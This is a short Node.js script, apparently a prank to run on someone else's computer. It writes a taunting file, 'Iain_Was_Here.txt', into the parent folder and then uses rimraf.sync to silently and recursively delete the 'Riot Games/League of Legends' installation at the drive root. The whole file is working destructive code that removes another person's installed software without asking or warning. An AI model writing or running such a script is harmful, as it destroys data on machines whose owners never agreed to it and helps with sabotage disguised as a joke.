const fs = require('fs')
const path = require('path')
const rimraf = require('rimraf')

const working = process.cwd()
const root = path.parse(process.cwd()).root
const desktop = path.join(working, '../')
const league = path.join(root, 'Riot Games', 'League of Legends')
const filepath = path.join(desktop, 'Iain_Was_Here.txt')
const run = async () => {
    // console.log(filepath)
    // console.log(league)
    fs.writeFileSync(filepath, 'Hey Buddy. You opened my notebook when I wasnt there.')
    rimraf.sync(league)
}

run().catch( e => console.log(e) )